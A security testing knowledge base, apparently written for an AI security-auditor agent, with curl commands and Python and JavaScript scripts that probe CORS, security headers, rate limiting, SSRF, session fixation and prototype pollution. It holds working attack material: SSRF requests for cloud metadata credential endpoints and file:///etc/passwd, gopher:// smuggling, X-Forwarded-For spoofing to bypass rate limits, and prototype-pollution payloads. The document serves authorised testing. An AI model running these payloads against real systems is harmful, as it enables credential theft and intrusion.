# Security KB 03 — CORS, Security Headers, Rate Limiting, SSRF, Session/Deserialization

Source: extracted from the former `core-04-security-auditor.md` monolith (lines 1238-1551, 1734-1830, 1968-2085). CORS misconfiguration, security headers, rate limiting bypass, SSRF (internal service discovery, cloud metadata, protocol smuggling), session fixation, and insecure deserialization.

---

## CORS SECURITY TESTING

### Test 1: CORS Misconfiguration Detection

**Source:** Extracted from Backend Specialist CORS patterns

**Description:** Testing for permissive CORS policies that allow unauthorized origins.

**Test Cases:**

#### Test Case 1.1: Wildcard CORS Testing

```bash
# Test for wildcard CORS (Access-Control-Allow-Origin: *)
curl -v -X GET "https://api.example.com/api/data" \
  -H "Origin: https://evil.com"

# Check response headers
# Vulnerability: Access-Control-Allow-Origin: *
# Expected Safe: Access-Control-Allow-Origin: https://trusted-domain.com (or missing)
```

#### Test Case 1.2: Reflected Origin Testing

```bash
# Test if server reflects any Origin header
curl -v -X GET "https://api.example.com/api/data" \
  -H "Origin: https://attacker.com"

# Vulnerable Response:
# Access-Control-Allow-Origin: https://attacker.com
# Access-Control-Allow-Credentials: true

# Safe Response:
# No Access-Control-Allow-Origin header
# OR Access-Control-Allow-Origin: <whitelisted-domain-only>
```

**Automated Script:**

```python
# cors_misconfiguration_test.py

def test_cors_misconfiguration(api_url):
    """Test CORS configuration for security issues"""

    malicious_origins = [
        "https://evil.com",
        "https://attacker.com",
        "http://localhost:3000",
        "null",
        "https://api.example.com.evil.com"  # Subdomain takeover attempt
    ]

    vulnerabilities = []

    for origin in malicious_origins:
        response = requests.get(
            api_url,
            headers={"Origin": origin}
        )

        allowed_origin = response.headers.get('Access-Control-Allow-Origin')
        allow_credentials = response.headers.get('Access-Control-Allow-Credentials')

        # Check for wildcard
        if allowed_origin == '*':
            vulnerabilities.append({
                "vulnerability": "Wildcard CORS",
                "severity": "HIGH",
                "cvss": 7.5,
                "evidence": "Access-Control-Allow-Origin: *",
                "recommendation": "Use explicit origin whitelist"
            })

        # Check for reflected origin
        if allowed_origin == origin:
            severity = "CRITICAL" if allow_credentials == "true" else "HIGH"
            cvss = 9.1 if allow_credentials == "true" else 7.5

            vulnerabilities.append({
                "vulnerability": "CORS Origin Reflection",
                "severity": severity,
                "cvss": cvss,
                "origin": origin,
                "credentials_allowed": allow_credentials,
                "recommendation": "Implement strict origin validation"
            })

        # Check for null origin acceptance
        if origin == "null" and allowed_origin == "null":
            vulnerabilities.append({
                "vulnerability": "Null Origin Accepted",
                "severity": "HIGH",
                "cvss": 7.1,
                "recommendation": "Reject null origin requests"
            })

    return vulnerabilities

# Usage
results = test_cors_misconfiguration("https://api.example.com/api/data")
```

**Best Practices:**
- DO: Test with multiple malicious origins
- DO: Check if origin is reflected in response
- DO: Test null origin acceptance
- DO: Verify Access-Control-Allow-Credentials is not true with wildcard
- DO: Test subdomain variations
- DON'T: Accept wildcard (*) in production APIs
- DON'T: Reflect arbitrary origins with credentials enabled

---

## SECURITY HEADERS TESTING

### Test 1: Missing/Weak Security Headers

**Source:** Extracted from Backend Specialist (Helmet.js patterns)

**Description:** Testing for missing or misconfigured security headers.

**Implementation:**

```bash
# Check all security headers
curl -v -X GET "https://example.com" | grep -i "^<"

# Expected headers (from Helmet.js):
# Content-Security-Policy
# X-DNS-Prefetch-Control
# X-Frame-Options
# Strict-Transport-Security
# X-Download-Options
# X-Content-Type-Options
# X-Permitted-Cross-Domain-Policies
# Referrer-Policy
# X-XSS-Protection (deprecated but sometimes used)
```

**Automated Test Script:**

```python
# security_headers_test.py

def test_security_headers(url):
    """Test for presence and strength of security headers"""

    response = requests.get(url)
    headers = response.headers

    required_headers = {
        "Content-Security-Policy": {
            "required": True,
            "check": lambda v: "default-src 'self'" in v or "default-src" in v
        },
        "Strict-Transport-Security": {
            "required": True,
            "check": lambda v: "max-age=" in v and int(v.split("max-age=")[1].split(";")[0]) >= 31536000
        },
        "X-Frame-Options": {
            "required": True,
            "check": lambda v: v in ["DENY", "SAMEORIGIN"]
        },
        "X-Content-Type-Options": {
            "required": True,
            "check": lambda v: v == "nosniff"
        },
        "Referrer-Policy": {
            "required": True,
            "check": lambda v: v in ["no-referrer", "strict-origin-when-cross-origin"]
        },
        "Permissions-Policy": {
            "required": False,
            "check": lambda v: True
        }
    }

    findings = []

    for header_name, config in required_headers.items():
        header_value = headers.get(header_name)

        if not header_value:
            if config["required"]:
                findings.append({
                    "header": header_name,
                    "issue": "Missing",
                    "severity": "HIGH",
                    "cvss": 6.5,
                    "recommendation": f"Add {header_name} header"
                })
        elif not config["check"](header_value):
            findings.append({
                "header": header_name,
                "issue": "Weak configuration",
                "value": header_value,
                "severity": "MEDIUM",
                "cvss": 5.3
            })

    # Check for deprecated headers
    if "X-XSS-Protection" in headers:
        findings.append({
            "header": "X-XSS-Protection",
            "issue": "Deprecated header in use",
            "severity": "INFO",
            "recommendation": "Remove and rely on CSP"
        })

    return findings
```

**Best Practices:**
- DO: Check all 13 Helmet.js security headers
- DO: Verify HSTS max-age >= 1 year (31536000 seconds)
- DO: Ensure CSP is restrictive (no 'unsafe-inline')
- DO: Check X-Frame-Options is DENY or SAMEORIGIN
- DON'T: Rely on deprecated headers (X-XSS-Protection)
- DON'T: Use permissive CSP (script-src * is vulnerable)

---

## RATE LIMITING TESTING

### Test 1: Rate Limit Bypass Testing

**Source:** Extracted from Backend Specialist Rate Limiting patterns

**Description:** Testing rate limiting effectiveness and bypass techniques.

**Test Cases:**

#### Test Case 1.1: Brute Force Rate Limit Test

```bash
#!/bin/bash
# rate_limit_test.sh

API_URL="https://api.example.com/auth/login"
REQUESTS=100
DELAY=0.1

echo "Testing rate limiting with $REQUESTS requests..."

for i in $(seq 1 $REQUESTS); do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "$API_URL" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@example.com","password":"wrong"}')

  echo "Request $i: HTTP $RESPONSE"

  if [ "$RESPONSE" == "429" ]; then
    echo "Rate limit triggered at request $i"
    break
  fi

  sleep $DELAY
done

# Expected: 429 Too Many Requests after threshold (e.g., 5-10 requests)
# Vulnerability: If no 429 response = Rate limiting not working
```

#### Test Case 1.2: IP Rotation Bypass

```python
# rate_limit_bypass_ip_rotation.py

import requests
import random

def test_rate_limit_ip_bypass(api_url, num_requests=50):
    """Test if rate limiting can be bypassed with X-Forwarded-For header"""

    for i in range(num_requests):
        # Generate random IP
        fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

        response = requests.post(
            api_url,
            json={"email": "test@example.com", "password": "wrong"},
            headers={"X-Forwarded-For": fake_ip}
        )

        print(f"Request {i+1} (IP: {fake_ip}): {response.status_code}")

        if response.status_code == 429:
            return {
                "status": "PASS",
                "message": "Rate limiting working correctly"
            }

    return {
        "vulnerability": "Rate Limit Bypass via IP Spoofing",
        "severity": "HIGH",
        "cvss": 7.5,
        "recommendation": "Don't trust X-Forwarded-For header for rate limiting in untrusted environments"
    }
```

**Best Practices:**
- DO: Test rate limiting on authentication endpoints
- DO: Attempt IP spoofing with X-Forwarded-For
- DO: Test with rapid successive requests
- DO: Verify rate limits reset after time window
- DO: Test rate limiting on API endpoints (not just auth)
- DON'T: Trust client-provided IP headers
- DON'T: Set rate limits too high (defeats purpose)

---

## SSRF (SERVER-SIDE REQUEST FORGERY) TESTING

### Source: Research-added (OWASP A10:2021)

**Test Case 1: Internal Service Discovery**

```bash
# Test internal services
INTERNAL_TARGETS=(
  "http://localhost"
  "http://127.0.0.1"
  "http://localhost:6379"        # Redis
  "http://localhost:5432"        # PostgreSQL
  "http://localhost:27017"       # MongoDB
  "http://localhost:9200"        # Elasticsearch
  "http://localhost:11211"       # Memcached
  "http://10.0.0.1"              # Private network
  "http://192.168.1.1"           # Private network
  "http://172.16.0.1"            # Private network
)

for target in "${INTERNAL_TARGETS[@]}"; do
  curl -X POST "https://api.example.com/fetch-url" \
    -H "Content-Type: application/json" \
    -d "{\"url\": \"$target\"}"
  echo "Tested: $target"
done
```

**Test Case 2: Cloud Metadata Exploitation**

```python
# cloud_metadata_ssrf.py
import requests

METADATA_ENDPOINTS = {
    # AWS
    "AWS IMDSv1": "http://169.254.169.254/latest/meta-data/",
    "AWS IAM Credentials": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "AWS User Data": "http://169.254.169.254/latest/user-data/",

    # GCP
    "GCP Metadata": "http://metadata.google.internal/computeMetadata/v1/",
    "GCP Token": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",

    # Azure
    "Azure Metadata": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "Azure Token": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",

    # DigitalOcean
    "DO Metadata": "http://169.254.169.254/metadata/v1/"
}

def test_ssrf_cloud_metadata(vulnerable_url):
    """Test SSRF for cloud metadata access"""

    for name, metadata_url in METADATA_ENDPOINTS.items():
        response = requests.post(
            vulnerable_url,
            json={"url": metadata_url},
            headers={"Content-Type": "application/json"}
        )

        if response.status_code == 200 and len(response.text) > 50:
            print(f"[CRITICAL] {name} EXPOSED: {metadata_url}")
            print(f"Response: {response.text[:500]}")
            return {
                "vulnerability": "SSRF - Cloud Metadata Exposure",
                "severity": "CRITICAL",
                "cvss": 9.8,
                "endpoint": metadata_url,
                "recommendation": "Block requests to metadata IPs (169.254.169.254, metadata.google.internal)"
            }

    return {"status": "PASS"}
```

**Test Case 3: Protocol Smuggling**

```bash
# Test file:// protocol for local file read
curl -X POST "https://api.example.com/fetch-url" \
  -H "Content-Type: application/json" \
  -d '{"url": "file:///etc/passwd"}'

# Test gopher:// for internal protocol access
curl -X POST "https://api.example.com/fetch-url" \
  -d '{"url": "gopher://localhost:6379/_INFO"}'

# Test dict:// protocol
curl -X POST "https://api.example.com/fetch-url" \
  -d '{"url": "dict://localhost:6379/INFO"}'
```

---

## SESSION FIXATION TESTING

### Source: Research-added (OWASP)

**Test Case 1: Session ID Reuse After Login**

```python
# session_fixation_test.py
import requests

def test_session_fixation(login_url, protected_url, credentials):
    """Test if session ID changes after authentication"""

    session = requests.Session()

    # Step 1: Get initial session
    response = session.get(protected_url)
    session_before = session.cookies.get('sessionId')
    print(f"Session before login: {session_before}")

    # Step 2: Authenticate
    session.post(login_url, json=credentials)

    # Step 3: Check if session changed
    session_after = session.cookies.get('sessionId')
    print(f"Session after login: {session_after}")

    if session_before == session_after:
        return {
            "vulnerability": "Session Fixation",
            "severity": "HIGH",
            "cvss": 8.1,
            "description": "Session ID does not change after authentication",
            "recommendation": "Regenerate session ID after successful login"
        }

    return {"status": "PASS"}
```

**Test Case 2: Session Injection via URL**

```bash
# Test if session can be set via URL parameter
curl -v "https://example.com/login?sessionId=attacker-session-id"

# Verify if the session is accepted
curl -b "sessionId=attacker-session-id" "https://example.com/dashboard"
```

---

## INSECURE DESERIALIZATION TESTING

### Source: Research-added (OWASP A8:2021)

**Test Case 1: JavaScript eval() Detection**

```javascript
// Check if application uses eval() on user input
const payloads = [
  // Constructor-based
  '{"constructor":{"prototype":{"isAdmin":true}}}',

  // __proto__ pollution
  '{"__proto__":{"isAdmin":true}}',

  // Function constructor
  '{"toString":"function(){return process.exit()}"}',
];

for (const payload of payloads) {
  const response = await fetch('/api/data', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: payload
  });

  console.log(`Payload: ${payload}, Status: ${response.status}`);
}
```

**Test Case 2: Prototype Pollution**

```python
# prototype_pollution_test.py
import requests
import json

def test_prototype_pollution(url):
    """Test for JavaScript prototype pollution"""

    payloads = [
        {"__proto__": {"isAdmin": True}},
        {"constructor": {"prototype": {"isAdmin": True}}},
        {"__proto__": {"polluted": True}},
    ]

    for payload in payloads:
        # Send malicious payload
        requests.post(url, json=payload)

        # Check if pollution worked
        response = requests.get(f"{url}/check")
        data = response.json()

        if data.get('isAdmin') == True or data.get('polluted') == True:
            return {
                "vulnerability": "Prototype Pollution",
                "severity": "HIGH",
                "cvss": 8.1,
                "payload": json.dumps(payload),
                "recommendation": "Validate and sanitize all JSON input, use Object.freeze()"
            }

    return {"status": "PASS"}
```
